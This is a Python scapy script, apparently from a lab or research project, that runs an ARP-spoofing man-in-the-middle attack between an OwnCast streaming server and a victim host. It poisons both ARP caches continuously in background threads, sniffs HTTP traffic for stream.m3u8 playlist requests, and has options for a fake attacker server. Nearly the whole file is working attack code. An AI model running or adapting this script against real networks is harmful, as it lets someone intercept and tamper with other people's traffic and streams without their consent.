import ipaddress
from getmac import get_mac_address as gma
from scapy.all import *
from scapy.layers.http import *
import sys
import argparse
import time
from scapy.layers.l2 import *
import threading

# NOTES #
# Run the following command in your Linux terminal:
# sysctl net.ipv4.ip_forward
# if it returns 0, then packets are not forwarded
# this means that a MITM attack will disable communication between victim and host
# Change this setting with:
# sudo sysctl -w net.ipv4.ip_forward=1

parser = argparse.ArgumentParser(description="OwnCast Packet Interceptor")
parser.add_argument("-host", default="192.168.56.106")  # Original OwnCast server
parser.add_argument("-port", default="8080")  # Port of original OwnCast server
parser.add_argument("-fake", default="192.168.56.104")  # IP of new OwnCast server
parser.add_argument("-fake_port", default="8080")  # Port of new OwnCast server
parser.add_argument("-victim", default="192.168.56.105")  # IP of victim
parser.add_argument("-interface", default="enp0s8")  # interface on which the victim and host are connected
args = parser.parse_args()

# struct.unpack("!I", socket.inet_aton(addr))[0]
host = ipaddress.IPv4Address(args.host)
port = args.port
fake = ipaddress.IPv4Address(args.fake)
fake_port = args.fake_port
victim = ipaddress.IPv4Address(args.victim)
interface = args.interface

# By default we use the destination (the real OwnCast) as the fake host but assume the port is different
# This is true in our testing model
if fake == "":
    fake = host
if fake_port == "":
    fake_port = port
if interface == "":
    interface = conf.iface

print(f"Starting attack with this input:")
print(f"Original OwnCast server on {host}:{port}")
print(f"Attacker OwnCast server on {fake}:{fake_port}")
print(f"Victim on {victim}")
print(f"Using interface {interface}")


# Function to print packets
def print_pkt(this_packet):
    # Filter only HTTP requests
    if not this_packet.haslayer(HTTPRequest):
        return

    http = this_packet[HTTPRequest]
    path = http.Path.decode()
    print(f"Got packet with path {path}")

    # Filter HTTP requests for stream.m3u8
    if 'stream.m3u8' not in path:
        return

    this_packet.show()

# Function to initiate an ARP attack
def init_arp(ip_victim, ip_server):
    # Lookup local MAC
    local_mac = gma(interface=interface)
    if local_mac is None:
        print(f"Could not find MAC for local machine")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found local MAC: {local_mac}")

    # Lookup victim MAC
    mac_victim = getmacbyip(str(ip_victim))
    if mac_victim is None:
        print(f"Could not find MAC for victim ({ip_victim})")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found victim ({ip_victim}) MAC: {mac_victim}")

    # Lookup server MAC
    mac_server = getmacbyip(str(ip_server))
    if mac_server is None:
        print(f"Could not find MAC for server ({ip_server})")
        print(f"Aborting operation")
        return False
    else:
        print(f"Found server ({ip_server}) MAC: {mac_server}")

    if local_mac == mac_victim or local_mac == mac_server or mac_victim == mac_server:
        print(f"MITM attack not possible in this setup (at least two devices are identical")
        print(f"Aborting operation")
        return False

    # Prepare ARP packets
    # tell victim that we are server
    arp = Ether() / ARP()
    arp[Ether].src = local_mac
    arp[ARP].hwsrc = local_mac
    arp[ARP].psrc = str(ip_server)
    arp[ARP].hwdst = mac_victim
    arp[ARP].pdst = str(ip_victim)

    print(f"Prepared ARP package to spoof as server for victim")

    # tell 102 that we are 101
    arp2 = Ether() / ARP()
    arp2[Ether].src = local_mac
    arp2[ARP].hwsrc = local_mac
    arp2[ARP].psrc = str(ip_victim)
    arp2[ARP].hwdst = mac_server
    arp2[ARP].pdst = str(ip_server)

    print(f"Prepared ARP package to spoof as victim for server")

    # Define repeating ARP injection
    def repeat_arp(this_packet):
        sendp(this_packet, iface=interface, loop=1, inter=2)  # send every 2 seconds

    # Run ARP injection as daemon thread
    thread1 = threading.Thread(target=repeat_arp, args=(arp,), daemon=True)
    thread2 = threading.Thread(target=repeat_arp, args=(arp2,), daemon=True)
    thread1.start()
    thread2.start()
    print(f"Started the injection threads")


# Patch for HTTP layers on ports other than port 80
print(f"Binding port {port} as an HTTP connection port")
bind_layers(TCP, HTTP, dport=int(port))
bind_layers(TCP, HTTP, sport=int(port))

# Run ARP Attack
print(f"Starting MITM between {victim} and {host}")
init_arp(victim, host)

filter_mask = "dst host " + str(host) + " and dst port " + str(port)
print(f"Filtering packets on {filter_mask}")
pkt = sniff(filter=filter_mask, prn=print_pkt)
